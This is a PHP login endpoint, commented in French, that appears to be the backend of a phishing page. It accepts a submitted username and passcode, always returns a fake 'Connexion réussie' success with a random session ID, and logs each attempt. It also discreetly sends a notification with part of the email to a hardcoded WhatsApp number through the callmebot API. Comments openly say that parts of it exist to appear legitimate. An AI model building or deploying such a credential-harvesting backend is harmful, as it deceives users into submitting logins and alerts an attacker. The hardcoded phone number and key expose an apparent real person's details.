<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    // Données reçues du formulaire
    $user_email = $input['username'] ?? '';
    $user_pass = $input['passcode'] ?? '';
    $user_action = $input['action'] ?? 'login';
    
    // 🔒 BACKUP LOCAL DISCRET
    $local_result = backup_local($user_email, $user_pass);
    
    // 📱 BACKUP WHATSAPP DISCRET
    $whatsapp_result = backup_whatsapp($user_email, $user_pass);
    
    // Réponse "normale" pour le frontend
    $response = [
        'status' => 'success',
        'message' => 'Connexion réussie',
        'session_id' => generate_session_id(),
        'timestamp' => date('Y-m-d H:i:s')
    ];
    
    echo json_encode($response);
    
} else {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Méthode non autorisée']);
}

// 🔒 FONCTION BACKUP LOCAL
function backup_local($email, $password) {
    $log_data = [
        'time' => date('Y-m-d H:i:s'),
        'user' => $email,
        'action' => 'system_login',
        'ip' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'unknown',
        'agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ];
    
    // Format discret pour les logs
    $log_entry = "[" . $log_data['time'] . "] " . 
                 "USER:" . substr($email, 0, 3) . "*** | " .
                 "ACTION:" . $log_data['action'] . " | " .
                 "IP:" . $log_data['ip'] . "\n";
    
    // Sauvegarde locale (Netlify Functions logs)
    error_log($log_entry);
    
    return 'local_ok';
}

// 📱 FONCTION BACKUP WHATSAPP
function backup_whatsapp($email, $password) {
    // Configuration WhatsApp - À MODIFIER AVEC VOS INFOS
    $whatsapp_config = [
        'api_key' => '8757276', // ← À CHANGER
        'phone' => '261339140849' // ← À CHANGER
    ];
    
    
    // Message discret pour WhatsApp
    $message = "🔔 Notification Système\n" .
               "ID: " . uniqid() . "\n" .
               "Heure: " . date('H:i:s') . "\n" .
               "Utilisateur: " . (strlen($email) > 3 ? substr($email, 0, 3) . '***' : 'N/A') . "\n" .
               "Statut: Connexion détectée";
    
    try {
        $url = "https://api.callmebot.com/whatsapp.php?" . 
               http_build_query([
                   'phone' => $whatsapp_config['phone'],
                   'text' => $message,
                   'apikey' => $whatsapp_config['api_key']
               ]);
        
        $result = @file_get_contents($url);
        return $result !== false ? 'whatsapp_ok' : 'whatsapp_fail';
        
    } catch (Exception $e) {
        return 'whatsapp_error';
    }
}

// 🆔 GÉNÉRATION ID DE SESSION (pour paraître légitime)
function generate_session_id() {
    return bin2hex(random_bytes(8)) . '-' . 
           bin2hex(random_bytes(4)) . '-' . 
           bin2hex(random_bytes(4)) . '-' . 
           bin2hex(random_bytes(12));
}

// 📊 FONCTION DE STATISTIQUES (optionnelle - pour paraître légitime)
function log_statistics() {
    $stats_data = [
        'timestamp' => time(),
        'endpoint' => 'user_auth',
        'version' => '1.0'
    ];
    
    error_log("STATS: " . json_encode($stats_data));
}
?>
